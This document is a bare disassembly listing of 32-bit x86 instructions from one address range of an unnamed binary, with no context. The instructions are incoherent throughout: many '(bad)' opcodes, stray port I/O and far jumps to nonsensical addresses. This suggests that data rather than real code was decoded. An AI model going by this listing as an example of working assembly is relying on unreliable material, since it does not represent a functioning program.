  40fa4b:	sbb    BYTE PTR [eax+0x64],bh
  40fa4e:	repnz popf 
  40fa50:	sar    DWORD PTR [ebx-0x1b33b578],1
  40fa56:	lods   eax,DWORD PTR ds:[esi]
  40fa57:	fwait
  40fa58:	daa    
  40fa59:	sti    
  40fa5a:	fistp  QWORD PTR es:[edx]
  40fa5d:	mov    ch,BYTE PTR cs:[ebp-0x3f3279d3]
  40fa64:	outs   dx,BYTE PTR ds:[esi]
  40fa65:	dec    ecx
  40fa66:	enter  0x5696,0x23
  40fa6a:	or     BYTE PTR [eax+0x77],0xd1
  40fa6e:	push   edx
  40fa6f:	adc    eax,0xfb37c8da
  40fa74:	popf   
  40fa75:	scas   al,BYTE PTR es:[edi]
  40fa76:	xchg   ebp,eax
  40fa77:	(bad)  
  40fa78:	jmp    0x40fa42
  40fa7a:	xchg   ebx,eax
  40fa7b:	pop    edi
  40fa7c:	pop    ecx
  40fa7d:	arpl   WORD PTR [edx],sp
  40fa7f:	add    ecx,0x6a
  40fa82:	mov    BYTE PTR [eax+edi*1+0x6c97a6e3],dh
  40fa89:	cwde   
  40fa8a:	and    ebx,DWORD PTR [edx]
  40fa8c:	ret    
  40fa8d:	push   ecx
  40fa8e:	push   0x58
  40fa90:	or     dl,dl
  40fa92:	loope  0x40fafa
  40fa94:	push   edx
  40fa95:	(bad)  
  40fa96:	sub    al,0x7a
  40fa98:	cmp    eax,0x303a5f2d
  40fa9d:	div    DWORD PTR ds:0xe51bc082
  40faa3:	and    BYTE PTR [edi],al
  40faa5:	mov    edx,0xe58c1326
  40faaa:	cmp    dl,BYTE PTR [ebx+0xcb6cbb5]
  40fab0:	inc    ebp
  40fab1:	jne    0x40fa64
  40fab3:	pop    esi
  40fab4:	mov    ebp,0x762ebee7
  40fab9:	fdiv   QWORD PTR [eax-0x614b8d9e]
  40fabf:	adc    esp,DWORD PTR [eax+0x27]
  40fac2:	in     eax,0x3
  40fac4:	shl    DWORD PTR [esi-0x3e],1
  40fac7:	(bad)  
  40fac8:	lods   al,BYTE PTR ds:[esi]
  40fac9:	call   0x61af25f4
  40face:	fild   QWORD PTR [ecx+0x6057d676]
  40fad4:	sbb    DWORD PTR [esi+0x2335cc7a],edi
  40fada:	pop    esi
  40fadb:	pushf  
  40fadc:	jecxz  0x40faf1
  40fade:	arpl   WORD PTR [edx-0x53e9ad0f],cx
  40fae4:	pop    ebp
  40fae5:	shr    DWORD PTR [ecx+0x48cbd645],cl
  40faeb:	pop    edx
  40faec:	sbb    al,0xfc
  40faee:	mov    ah,0x3e
  40faf0:	mov    ebx,0x72137ede
  40faf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faf6:	jb     0x40faae
  40faf8:	out    dx,al
  40faf9:	mov    ds:0xfe6f0f45,eax
  40fafe:	cmp    al,0x62
  40fb00:	shl    BYTE PTR [eax+0x2d],1
  40fb03:	mov    ds:0x85c16449,al
  40fb08:	call   0xe0580604
  40fb0d:	mov    ecx,0xefaaf350
  40fb12:	repz ret 0x255d
  40fb16:	test   DWORD PTR [eax-0x6e1b8fb4],esi
  40fb1c:	je     0x40faa4
  40fb1e:	cmc    
  40fb1f:	in     al,dx
  40fb20:	jns    0x40fb19
  40fb22:	push   edi
  40fb23:	in     al,dx
  40fb24:	jne    0x40fb97
  40fb26:	inc    ebx
  40fb27:	in     eax,0xf3
  40fb29:	or     eax,0x3616fc63
  40fb2e:	mov    edi,DWORD PTR [eax+0x64]
  40fb31:	aam    0xe
  40fb33:	mov    ebx,0x8a5e68ce
  40fb38:	inc    edx
  40fb39:	in     al,dx
  40fb3a:	(bad)  
  40fb3b:	outs   dx,DWORD PTR ds:[esi]
  40fb3c:	jne    0x40fb7d
  40fb3e:	dec    edi
  40fb3f:	push   esi
  40fb40:	pop    ds
  40fb41:	jno    0x40fb50
  40fb43:	xor    eax,0x56d2bd27
  40fb48:	ins    BYTE PTR es:[edi],dx
  40fb49:	retf   
  40fb4a:	jb     0x40faea
  40fb4c:	adc    ch,bl
  40fb4e:	in     eax,0x4a
  40fb50:	call   0xeea4:0x39a1c7ea
  40fb57:	ds ret 
  40fb59:	dec    eax
  40fb5a:	sub    ch,BYTE PTR [edx+ebp*2+0x2c]
  40fb5e:	dec    edx
  40fb5f:	dec    ecx
  40fb60:	outs   dx,DWORD PTR ds:[esi]
  40fb61:	or     eax,0x581d90b9
  40fb66:	shr    esp,0xb4
  40fb69:	ret    
  40fb6a:	push   esp
  40fb6b:	lods   al,BYTE PTR ds:[esi]
  40fb6c:	push   ss
  40fb6d:	out    dx,eax
  40fb6e:	inc    edi
  40fb6f:	test   DWORD PTR [ecx+0xe],ebx
  40fb72:	mov    al,0x9
  40fb74:	add    eax,0xb2393502
  40fb79:	adc    DWORD PTR [eax],esi
  40fb7b:	mov    ebx,0x318c4870
  40fb80:	inc    esi
  40fb81:	mov    dl,BYTE PTR [esi+0x403f43b4]
  40fb87:	xor    DWORD PTR [edi+eiz*8+0x1c],ecx
  40fb8b:	xchg   esp,eax
  40fb8c:	std    
  40fb8d:	xor    al,0x69
  40fb8f:	mov    ebp,0x8339be88
  40fb94:	pop    edx
  40fb95:	inc    edx
  40fb96:	adc    ebp,DWORD PTR [edi+0x7e]
  40fb99:	arpl   WORD PTR [esi+0x7e8dc079],di
  40fb9f:	test   BYTE PTR [ebx-0x78],al
  40fba2:	retf   0xcee5
  40fba5:	or     eax,0xe7ff049a
  40fbaa:	and    DWORD PTR [ebx],esi
  40fbac:	bound  ecx,QWORD PTR [eax+0x51943f2]
  40fbb2:	fwait
  40fbb3:	cs out 0x87,al
  40fbb6:	ja     0x40fb9c
  40fbb8:	or     bh,BYTE PTR [esi]
  40fbba:	(bad)  
  40fbbb:	fdiv   DWORD PTR [ecx]
  40fbbd:	or     bh,bl
  40fbbf:	xor    edx,DWORD PTR [edx+ebx*1+0x5e59bd96]
  40fbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbc7:	pop    esi
  40fbc8:	jle    0x40fbfd
  40fbca:	mov    al,0x24
  40fbcc:	enter  0x820e,0xed
  40fbd0:	push   ss
  40fbd1:	lds    esi,FWORD PTR [edx+0x3e]
  40fbd4:	sub    eax,0xf040d833
  40fbd9:	(bad)  
  40fbda:	cmp    al,0x79
  40fbdc:	sub    cl,al
  40fbde:	sar    DWORD PTR [edi-0x15d05490],cl
  40fbe4:	adc    BYTE PTR [eax+0x59],ah
  40fbe7:	shr    DWORD PTR [edi-0x14cb3240],1
  40fbed:	cmp    esp,DWORD PTR [esi]
  40fbef:	sbb    al,0x29
  40fbf1:	inc    ebx
  40fbf2:	xor    eax,0x201467f
  40fbf7:	cmp    BYTE PTR [eax-0x2f],ah
  40fbfa:	imul   ebp,DWORD PTR [edx],0x2fdc414c
  40fc00:	jge    0x40fc0c
  40fc02:	mov    edi,0x6d8d8ca7
  40fc07:	pop    edx
  40fc08:	jge    0x40fc77
  40fc0a:	cwde   
  40fc0b:	in     eax,dx
  40fc0c:	xor    eax,0x33908281
  40fc11:	xor    al,0x11
  40fc13:	jae    0x40fc71
  40fc15:	xchg   esi,eax
  40fc16:	add    esi,DWORD PTR [edx]
  40fc18:	mov    ah,0xc9
  40fc1a:	cmp    DWORD PTR [ebx*1-0x25a67dbe],0xffffffe6
  40fc22:	mov    cl,0x25
  40fc24:	push   0xff610f28
  40fc29:	loop   0x40fc01
  40fc2b:	sub    BYTE PTR [ecx-0x2a779601],0xa6
  40fc32:	sub    al,0x33
  40fc34:	lods   al,BYTE PTR ds:[esi]
  40fc35:	push   ebx
  40fc36:	mov    edx,0x8ee9d968
  40fc3b:	sub    DWORD PTR [ebp+0x50],edi
  40fc3e:	and    al,0xf2
  40fc40:	in     al,0x91
  40fc42:	pop    esi
  40fc43:	cmp    BYTE PTR [esi-0x1d],dh
  40fc46:	cmc    
  40fc47:	imul   ecx,DWORD PTR [ebx],0xffffffa2
  40fc4a:	lea    esi,[edi+0x561e2b0d]
  40fc50:	int    0xe7
  40fc52:	shr    DWORD PTR [esi+0x6a1c37c2],0xa3
  40fc59:	pop    esi
  40fc5a:	push   ebx
  40fc5b:	xchg   ecx,eax
  40fc5c:	jae    0x40fc3c
  40fc5e:	ret    0x70b9
  40fc61:	mov    ecx,0xcdaa547b
  40fc66:	fwait
  40fc67:	inc    esi
  40fc68:	xlat   BYTE PTR ds:[ebx]
  40fc69:	mov    ds:0x50d75632,al
  40fc6e:	das    
  40fc6f:	fs mov al,0x31
  40fc72:	jecxz  0x40fceb
  40fc74:	pop    edi
  40fc75:	add    bl,BYTE PTR [ecx-0x7a6a1400]
  40fc7b:	(bad)  
  40fc7c:	icebp  
  40fc7d:	xchg   ecx,eax
  40fc7e:	push   ss
  40fc7f:	inc    ebp
  40fc80:	xor    ebp,ecx
  40fc82:	add    al,0x87
  40fc84:	lock das 
  40fc86:	jp     0x40fcf9
  40fc88:	pop    esp
  40fc89:	loop   0x40fc9b
  40fc8b:	in     eax,0x2d
  40fc8d:	jae    0x40fcdc
  40fc8f:	pop    edx
  40fc90:	mov    eax,0x7133bd78
  40fc95:	outs   dx,BYTE PTR ds:[esi]
  40fc96:	mov    edi,0xd1965b7
  40fc9b:	gs jmp 0xc638:0x8e93464d
  40fca3:	mov    edx,0x1a5bab30
  40fca8:	xchg   DWORD PTR [edx-0x76d1f531],esp
  40fcae:	jnp    0x40fcfc
  40fcb0:	scas   al,BYTE PTR es:[edi]
  40fcb1:	stos   DWORD PTR es:[edi],eax
  40fcb2:	icebp  
  40fcb3:	mov    bh,0xe5
  40fcb5:	jge    0x40fce8
  40fcb7:	cld    
  40fcb8:	lds    ecx,FWORD PTR [edx-0x58bee79b]
  40fcbe:	fnstsw WORD PTR [bp+di]
  40fcc1:	pop    edx
  40fcc2:	xor    bh,ah
  40fcc4:	adc    cl,0xe6
  40fcc7:	loope  0x40fc9e
  40fcc9:	(bad)  
  40fcca:	cld    
  40fccb:	fistp  QWORD PTR [ecx-0x9c6f569]
  40fcd1:	push   esp
  40fcd2:	popf   
  40fcd3:	jecxz  0x40fce2
  40fcd5:	mov    esi,0x7bbd2434
  40fcda:	pop    esi
  40fcdb:	(bad)
  40fcdf:	pushf  
  40fce0:	stc    
  40fce1:	bound  ebp,QWORD PTR [eax-0x434a6d4c]
  40fce7:	mov    dh,0x10
  40fce9:	cs fs jns 0x40fcda
  40fced:	ror    al,0xe5
  40fcf0:	mov    ecx,0x6811443a
  40fcf5:	popa   
  40fcf6:	repnz mov esi,ds
  40fcf9:	inc    edi
  40fcfa:	repnz pop ds
  40fcfc:	nop
  40fcfd:	lods   al,BYTE PTR ds:[esi]
  40fcfe:	retf   0x5532
  40fd01:	and    cl,BYTE PTR [eax]
  40fd03:	mov    eax,0xb5e34074
  40fd08:	ds inc edx
  40fd0a:	(bad)  
  40fd0b:	hlt    
  40fd0c:	push   ebx
  40fd0d:	fld    QWORD PTR [ebx-0x1e]
  40fd10:	and    ebx,DWORD PTR [eax]
  40fd12:	sbb    al,0x3
  40fd14:	test   eax,0x8a82c0d8
  40fd19:	push   eax
  40fd1a:	lock das 
  40fd1c:	sub    DWORD PTR [edx],ebp
  40fd1e:	mov    esi,0x9505da31
  40fd23:	sub    edi,DWORD PTR [esi]
  40fd25:	dec    edx
  40fd26:	push   edi
  40fd27:	mov    esi,0xa13cc0c5
  40fd2c:	pop    ds
  40fd2d:	pop    ebx
  40fd2e:	daa    
  40fd2f:	in     al,dx
  40fd30:	push   ebp
  40fd31:	leave  
  40fd32:	pop    edi
  40fd33:	xchg   edx,eax
  40fd34:	stos   BYTE PTR es:[edi],al
  40fd35:	jmp    0xbdcd:0x7e13f2fe
  40fd3c:	sub    al,ah
  40fd3e:	or     DWORD PTR [eax-0x60],edx
  40fd41:	jp     0x40fd6b
  40fd43:	push   eax
  40fd44:	sti    
  40fd45:	cwde   
  40fd46:	dec    ebx
  40fd47:	pop    esp
  40fd48:	jnp    0x40fdbd
  40fd4a:	mov    DWORD PTR [ebx-0x71],ecx
  40fd4d:	imul   eax,DWORD PTR ds:[edx+ecx*1+0x1787663a],0xffffffd4
  40fd56:	or     eax,0x3fd253a0
  40fd5b:	fs das 
  40fd5d:	add    BYTE PTR [ebx+0x17],dh
  40fd60:	sbb    al,0x44
  40fd62:	mov    ds:0x3eb22d65,eax
  40fd67:	int    0x86
  40fd69:	pop    ebp
  40fd6a:	xchg   DWORD PTR [esi-0x46],ebx
  40fd6d:	fcos   
  40fd6f:	lea    ebx,[eax]
  40fd71:	jl     0x40fd79
  40fd73:	pop    eax
  40fd74:	mov    al,0xff
  40fd76:	ret    0x5f88
  40fd79:	sbb    edx,0xe4697097
  40fd7f:	mov    ah,BYTE PTR [edi+0x1e]
  40fd82:	lea    esp,[edi-0x46f6d333]
  40fd88:	jle    0x40fdab
  40fd8a:	(bad)
  40fd8e:	lods   eax,DWORD PTR ds:[esi]
  40fd8f:	add    ebx,edi
  40fd91:	fistp  WORD PTR cs:[esp+edi*4-0xf]
  40fd96:	lods   eax,DWORD PTR ds:[esi]
  40fd97:	data16 cmc 
  40fd99:	and    eax,0x78d94b3c
  40fd9e:	(bad)  
  40fd9f:	jge    0x40fde8
  40fda1:	repz push ss
  40fda3:	sbb    esi,DWORD PTR [eax-0x6]
  40fda6:	add    DWORD PTR [ecx],ecx
  40fda8:	mov    bh,ah
  40fdaa:	out    dx,al
  40fdab:	adc    cl,cl
  40fdad:	xchg   ecx,eax
  40fdae:	aas    
  40fdaf:	ret    
  40fdb0:	jo     0x40fdf0
  40fdb2:	clc    
  40fdb3:	das    
  40fdb4:	push   ebp
  40fdb5:	xor    ebx,0xffffffa5
  40fdb8:	das    
  40fdb9:	lds    ebx,FWORD PTR [edx]
  40fdbb:	inc    ebp
  40fdbc:	adc    ecx,DWORD PTR [ecx-0x52]
  40fdbf:	shr    DWORD PTR [edi+ebx*4+0x7e],1
  40fdc3:	out    0xbc,al
  40fdc5:	adc    eax,0x175a99bc
  40fdca:	cmp    al,0xc3
  40fdcc:	int3   
  40fdcd:	add    edi,DWORD PTR [esi]
  40fdcf:	xchg   ebx,eax
  40fdd0:	adc    esi,edx
  40fdd2:	push   ebp
  40fdd3:	fdiv   st,st(0)
  40fdd5:	es lock cld 
  40fdd8:	mov    ecx,0x32c2c7f8
  40fddd:	xor    bh,al
  40fddf:	xchg   ecx,eax
  40fde0:	call   0x4f72:0x1d40f988
  40fde7:	fistp  DWORD PTR [ebp-0x1903b4a0]
  40fded:	pop    edx
  40fdee:	adc    DWORD PTR [ecx-0x5fe80653],eax
  40fdf4:	pop    edx
  40fdf5:	pop    eax
  40fdf6:	cmc    
  40fdf7:	jmp    0x40fd7b
  40fdf9:	outs   dx,BYTE PTR ds:[esi]
  40fdfa:	gs inc ecx
  40fdfc:	jne    0x40fe11
  40fdfe:	jg     0x40fe6e
  40fe00:	(bad)  
  40fe01:	cli    
  40fe02:	or     BYTE PTR [esi-0x63],0xc4
  40fe06:	das    
  40fe07:	or     DWORD PTR [ebx],0xf99b48a6
  40fe0d:	sbb    edi,DWORD PTR [edx]
  40fe0f:	mov    eax,0xa52cc16a
  40fe14:	xor    al,0x18
  40fe16:	in     al,0x54
  40fe18:	mov    ds:0xd5ac4210,eax
  40fe1d:	push   esp
  40fe1e:	push   ecx
  40fe20:	leave  
  40fe21:	pop    ds
  40fe22:	test   eax,0x631b187c
  40fe27:	add    BYTE PTR [edi+0x4],ch
  40fe2a:	mov    BYTE PTR [ecx],bh
  40fe2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe2d:	inc    esp
  40fe2e:	int    0x51
  40fe30:	out    dx,eax
  40fe31:	aas    
  40fe32:	aam    0xab
  40fe34:	push   ss
  40fe35:	je     0x40fea7
  40fe37:	loope  0x40fdbf
  40fe39:	or     BYTE PTR [esi],0x95
  40fe3c:	inc    edx
  40fe3d:	inc    ebx
  40fe3e:	fdecstp 
  40fe40:	clc    
  40fe41:	mov    BYTE PTR [esi],al
  40fe43:	pop    esi
  40fe44:	jg     0x40fde0
  40fe46:	sub    al,0x66
  40fe48:	and    dl,cl
  40fe4a:	jne    0x40fe15
  40fe4c:	(bad)  
  40fe4d:	enter  0xdb44,0xac
  40fe51:	sbb    BYTE PTR [ecx-0x33],ah
  40fe54:	cld    
  40fe55:	popf   
  40fe56:	pop    ebx
  40fe57:	in     eax,0x16
  40fe59:	arpl   WORD PTR [esp+ebp*2-0x54],bp
  40fe5d:	int    0x34
  40fe5f:	retf   
  40fe60:	and    al,0x6d
  40fe62:	jmp    0x668363eb
  40fe67:	pushf  
  40fe68:	neg    ch
  40fe6a:	add    ebx,edi
  40fe6c:	adc    dh,ch
  40fe6e:	jmp    0x2423:0xe860d5dd
  40fe75:	cs inc ebp
  40fe77:	enter  0x34c7,0x0
  40fe7b:	aas    
  40fe7c:	inc    esi
  40fe7d:	jno    0x40fe9f
  40fe7f:	dec    esp
  40fe80:	xor    edx,DWORD PTR [ecx]
  40fe82:	mov    al,ds:0x5b0e2cd2
  40fe87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe88:	jle    0x40fea6
  40fe8a:	pop    ebp
  40fe8b:	fst    DWORD PTR [ebx+eax*2-0x6f]
  40fe8f:	ret    0x25af
  40fe92:	xchg   BYTE PTR [ebp-0x64],dl
  40fe95:	retf   
  40fe96:	shl    BYTE PTR [esi],cl
  40fe98:	adc    ch,0x2b
  40fe9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe9c:	mov    DWORD PTR [ecx-0xfd94300],esp
  40fea2:	popa   
  40fea3:	fucomip st,st(2)
  40fea5:	fldlg2 
  40fea7:	and    edi,ecx
  40fea9:	cmc    
  40feaa:	fldenv ds:0x836a5643
  40feb1:	(bad)  
  40feb2:	lock scas eax,DWORD PTR es:[edi]
  40feb4:	push   ebx
  40feb5:	out    0xd7,eax
  40feb7:	mov    al,0x95
  40feb9:	pushf  
  40feba:	push   esp
  40febb:	bound  eax,QWORD PTR [edi-0x80]
  40febe:	mov    ebx,0x4ab85359
  40fec3:	test   al,0x85
  40fec5:	mov    eax,ds:0xae97963d
  40feca:	test   DWORD PTR [esi+0x61a184cc],edx
  40fed0:	frstor [esp+eiz*2-0x6]
  40fed4:	icebp  
  40fed5:	pop    esi
  40fed6:	cvtps2pd xmm0,QWORD PTR [eax-0x63]
  40feda:	addr16 retf 
  40fedc:	lods   eax,DWORD PTR ds:[esi]
  40fedd:	xor    al,0xac
  40fedf:	mov    BYTE PTR [eax-0x65],ch
  40fee2:	mov    bh,0xb3
  40fee4:	loop   0x40ff18
  40fee6:	fwait
  40fee7:	cmp    ah,ch
  40fee9:	shl    BYTE PTR [eax-0xe],1
  40feec:	inc    edx
  40feed:	xchg   ebx,eax
  40feee:	mov    bl,0xc5
  40fef0:	inc    ebp
  40fef1:	into   
  40fef2:	xchg   ecx,eax
  40fef3:	push   edx
  40fef4:	xchg   ecx,eax
  40fef5:	mov    ebp,ebx
  40fef7:	adc    DWORD PTR [ecx-0x657c001c],esi
  40fefd:	jmp    FWORD PTR [eax-0x5b]
  40ff00:	pop    ds
  40ff01:	sahf   
  40ff02:	cmp    al,0xf6
  40ff05:	push   ebp
  40ff06:	iret   
  40ff07:	ja     0x40ff81
  40ff09:	and    eax,0x616ce99
  40ff0e:	shl    DWORD PTR [edx+eax*4],1
  40ff11:	xchg   edi,eax
  40ff12:	ror    dl,0x77
  40ff15:	cmp    ch,ch
  40ff17:	and    eax,0xb7ef102f
  40ff1c:	test   al,0xcd
  40ff1e:	adc    BYTE PTR [edx-0x594cc016],ch
  40ff24:	dec    ebp
  40ff25:	jl     0x40fedf
  40ff27:	push   eax
  40ff28:	dec    ebx
  40ff29:	or     BYTE PTR [ecx-0x12],al
  40ff2c:	imul   ebp,edx,0x94980764
  40ff32:	mov    esp,0x6ecba87e
  40ff37:	pop    eax
  40ff38:	push   esi
  40ff39:	pop    ebx
  40ff3a:	adc    ecx,DWORD PTR [esi]
  40ff3c:	lock sub al,0x8a
  40ff3f:	stos   BYTE PTR es:[edi],al
  40ff40:	imul   ecx,DWORD PTR [edx-0x37b43ffe],0x3a
  40ff47:	int3   
  40ff48:	push   0x755f3c0d
  40ff4d:	or     BYTE PTR gs:[edi-0x3b],0x4e
  40ff52:	dec    ebp
  40ff53:	cwde   
  40ff54:	popa   
  40ff55:	gs add esi,DWORD PTR cs:[esi+0x40fa2934]
  40ff5d:	and    DWORD PTR [eax-0x603529ea],0xffffffd2
  40ff64:	jne    0x40ff63
  40ff66:	xchg   ebp,eax
  40ff67:	sar    DWORD PTR [ebx+0x12],cl
  40ff6a:	popa   
  40ff6b:	jbe    0x40ff6d
  40ff6d:	sbb    al,0x8b
  40ff6f:	fsub   st(6),st
  40ff71:	and    BYTE PTR [ebx+0x3045e79b],0x30
  40ff78:	xor    dh,BYTE PTR [edx+0x4f76de17]
  40ff7e:	sub    DWORD PTR [ebx+0xe0cce78],0x46
  40ff85:	sub    al,0x21
  40ff87:	dec    esi
  40ff88:	mov    edx,DWORD PTR [ebp+0x39]
  40ff8b:	adc    eax,0xe529eefc
  40ff90:	or     DWORD PTR [eax-0xcd3b87e],ebp
  40ff96:	pop    ecx
  40ff97:	push   ebx
  40ff98:	pop    eax
  40ff99:	fisttp QWORD PTR [ecx+0x73]
  40ff9c:	(bad)  
  40ff9d:	add    al,BYTE PTR [edi+eiz*1-0x165ffa3d]
  40ffa4:	mov    ch,0x9c
  40ffa6:	out    0x2b,eax
  40ffa8:	jns    0x40ff68
  40ffaa:	add    BYTE PTR [eax-0x71c29349],bh
  40ffb0:	ds mov dl,0x8f
  40ffb3:	push   ebx
  40ffb4:	and    ecx,edx
  40ffb6:	cmp    al,0xae
  40ffb8:	or     eax,0xa30aeb3b
  40ffbd:	mov    ah,0x25
  40ffbf:	into   
  40ffc0:	push   edx
  40ffc1:	fild   DWORD PTR [ecx+0x5df3b6c7]
  40ffc7:	xor    dh,BYTE PTR [ecx+0x1a3904c5]
  40ffcd:	popf   
  40ffce:	lds    ecx,FWORD PTR [esi+0x387f5425]
  40ffd4:	push   ebx
  40ffd5:	sub    eax,0xf4350ee9
  40ffda:	jle    0x40ffd0
  40ffdc:	or     ah,al
  40ffde:	aad    0xad
  40ffe0:	fidiv  DWORD PTR [edi+0x7a29d061]
  40ffe6:	and    cl,cl
  40ffe8:	iret   
  40ffe9:	sub    al,0x14
  40ffeb:	push   ecx
  40ffec:	test   DWORD PTR [ebp-0x7238b7cc],esi
  40fff2:	cmc    
  40fff3:	into   
  40fff4:	mov    ds:0x4e3163d,al
  40fff9:	das    
  40fffa:	add    eax,0x30fcc80a
  40ffff:	push   ds
  410000:	das    
  410001:	aaa    
  410002:	les    ebx,FWORD PTR [esp+ebx*4+0x23]
  410006:	fbstp  TBYTE PTR [edi+0x61]
  410009:	jg     0x41000d
  41000b:	sub    ebx,DWORD PTR [edi+ebp*1-0x1c54873d]
  410012:	inc    ebp
  410013:	jl     0x410093
  410015:	pop    ss
  410016:	into   
  410017:	or     BYTE PTR [edx],cl
  410019:	out    dx,eax
  41001a:	xlat   BYTE PTR ds:[ebx]
  41001b:	mov    ch,0x50
  41001d:	stos   BYTE PTR es:[edi],al
  41001e:	mov    esi,0x4d81de78
  410023:	dec    edx
  410024:	stc    
  410025:	fld    QWORD PTR [esi-0x7881e41d]
  41002b:	push   0x60776cfd
  410030:	(bad)  
  410031:	aad    0x74
  410033:	in     al,dx
  410034:	fs aas 
  410036:	fstp   QWORD PTR [ebp-0x14d473cd]
  41003c:	ror    BYTE PTR fs:[edi],0xeb
  410040:	repnz (bad) 
  410043:	test   DWORD PTR [edx+0x11],esi
  410046:	ja     0x4100c4
  410048:	xor    dh,BYTE PTR [eax-0x6f2d830c]
  41004e:	leave  
  41004f:	clc    
  410050:	mov    dh,0xf0
  410052:	(bad)  
  410053:	cwde   
  410054:	ss adc esp,edi
  410057:	dec    edx
  410058:	mov    esi,0x5038fd36
  41005d:	push   edi
  41005e:	test   BYTE PTR [esi-0x19],0x5b
  410062:	fbstp  TBYTE PTR [esi-0x3b60c918]
  410068:	pusha  
  410069:	jle    0x410011
  41006b:	and    al,0x43
  41006d:	lods   eax,DWORD PTR ds:[esi]
  41006e:	stc    
  41006f:	nop
  410070:	ss ds ror ecx,cl
  410074:	rcl    ebp,cl
  410076:	(bad)  
  410077:	cdq    
  410078:	test   al,0xc3
  41007a:	jne    0x4100b1
  41007c:	add    eax,0xdb12169d
  410081:	call   0x84ec99f2
  410086:	lock sbb eax,0x89a6b61e
  41008c:	data16 cmp ch,BYTE PTR [ecx-0x6e2c7edf]
  410093:	call   0x55e5c21b
  410098:	aam    0x11
  41009a:	xchg   edi,eax
  41009b:	xlat   BYTE PTR ds:[ebx]
  41009c:	mov    ebx,0x5792b51a
  4100a1:	cmp    al,0xc3
  4100a3:	pop    ecx
  4100a4:	xor    eax,DWORD PTR [ebx-0x53]
  4100a7:	push   ebx
  4100a8:	mov    ebx,0x1297625f
  4100ad:	sbb    bh,BYTE PTR [ebx]
  4100af:	cld    
  4100b0:	xor    dh,dl
  4100b2:	and    BYTE PTR [eax],bh
  4100b4:	daa    
  4100b5:	pop    ebp
  4100b6:	and    BYTE PTR ds:0x9a2cc06b,ah
  4100bc:	xchg   DWORD PTR [di+0x40ff],edi
  4100c1:	hlt    
  4100c2:	xlat   BYTE PTR ds:[ebx]
  4100c3:	inc    ebx
  4100c4:	or     DWORD PTR [ebx],ebp
  4100c6:	jle    0x410146
  4100c8:	and    edi,ebp
  4100ca:	fdivr  QWORD PTR [ecx]
  4100cc:	jbe    0x4100eb
  4100ce:	lea    eax,[edi+0x69b560fa]
  4100d4:	cmp    bh,dl
  4100d6:	nop
  4100d7:	xchg   edx,eax
  4100d8:	scas   al,BYTE PTR es:[edi]
  4100d9:	mov    bh,0x84
  4100db:	push   eax
  4100dc:	ret    0x9ad4
  4100df:	xor    BYTE PTR [ebx],bh
  4100e1:	xchg   ecx,eax
  4100e2:	push   ss
  4100e3:	addr16 mov ecx,0x88e8fddc
  4100e9:	xor    BYTE PTR [eax+0x7df32860],ah
  4100ef:	sti    
  4100f0:	and    BYTE PTR [edx+0x2a],dl
  4100f3:	sbb    ebp,DWORD PTR [esi-0xb]
  4100f6:	out    dx,eax
  4100f7:	dec    edx
  4100f8:	or     eax,0x6c366fa2
  4100fd:	sbb    ah,ah
  4100ff:	ret    
  410100:	xchg   esp,eax
  410101:	les    esi,FWORD PTR [eax+0x330ceed0]
  410107:	std    
  410108:	mov    eax,0x5bb5ab76
  41010d:	sub    ah,BYTE PTR [ecx]
  41010f:	xchg   DWORD PTR [edx-0x7b138316],ecx
  410115:	scas   al,BYTE PTR es:[edi]
  410116:	int3   
  410117:	test   BYTE PTR [eax+0x40],bh
  41011a:	das    
  41011b:	outs   dx,DWORD PTR ds:[esi]
  41011c:	add    eax,0xa752a9a8
  410121:	stc    
  410122:	and    eax,0x1e0f1bef
  410127:	adc    edi,DWORD PTR [edx-0x57]
  41012a:	scas   eax,DWORD PTR es:[edi]
  41012b:	mov    ebx,0xb74ff208
  410130:	int3   
  410131:	adc    al,0x16
  410133:	pop    ss
  410134:	pop    ebp
  410135:	imul   ebp,ebx,0x4a2e6160
  41013b:	push   0x35b95761
  410140:	and    cl,BYTE PTR [ebx-0x572cffd7]
  410146:	test   al,0x0
  410148:	push   edi
  410149:	or     ch,al
  41014b:	xchg   BYTE PTR [ebx+0x52c431a1],al
  410151:	push   eax
  410152:	xchg   al,dl
  410154:	mov    ecx,0xd24a853e
  410159:	jb     0x4100fa
  41015b:	push   esi
  41015c:	pop    eax
  41015d:	cmc    
  41015e:	dec    ebx
  41015f:	dec    ebp
  410160:	sbb    BYTE PTR [eax+ebx*8-0x34133bf5],al
  410167:	inc    ecx
  410168:	jno    0x41016b
  41016a:	call   0x7d35:0xdd1fce1f
  410171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410172:	and    DWORD PTR [edx],0x7091822a
  410178:	repz mov al,0x4f
  41017b:	outs   dx,DWORD PTR ds:[esi]
  41017c:	add    eax,0x1adb5c48
  410181:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410182:	ror    DWORD PTR [esi+0x7b],cl
  410185:	ja     0x410169
  410187:	mov    al,ds:0xcdd4c66d
  41018c:	in     eax,dx
  41018d:	inc    edx
  41018e:	cmp    ecx,ebx
  410190:	add    BYTE PTR [ebp+0x73],0x25
  410194:	out    dx,al
  410195:	test   al,0x3d
  410197:	dec    esp
  410198:	stos   BYTE PTR es:[edi],al
  410199:	or     al,0x95
  41019b:	jl     0x41017e
  41019d:	sbb    eax,DWORD PTR [ecx+0x642739ef]
  4101a3:	out    0x66,eax
  4101a5:	xor    al,0x8f
  4101a7:	in     al,0x28
  4101a9:	sbb    bl,cl
  4101ab:	scas   al,BYTE PTR es:[edi]
  4101ac:	popf   
  4101ad:	les    ecx,FWORD PTR [edi]
  4101af:	(bad)  
  4101b0:	jns    0x41017e
  4101b2:	aad    0xd8
  4101b4:	mov    eax,eax
  4101b6:	pop    edi
  4101b7:	(bad)  
  4101b9:	add    dh,dh
  4101bb:	ret    
  4101bc:	mov    BYTE PTR ds:[edi+0x7ec9d88],ch
  4101c3:	aas    
  4101c4:	inc    esp
  4101c5:	(bad)  
  4101c6:	pop    esp
  4101c7:	xor    DWORD PTR [edx+0x14],esi
  4101ca:	xlat   BYTE PTR ds:[ebx]
  4101cb:	arpl   WORD PTR [esi],bp
  4101cd:	pop    edx
  4101ce:	das    
  4101cf:	aad    0xa3
  4101d1:	jne    0x7f65aac
  4101d7:	loopne 0x41019b
  4101d9:	sub    edx,DWORD PTR [edi+0x5d]
  4101dc:	pop    ebx
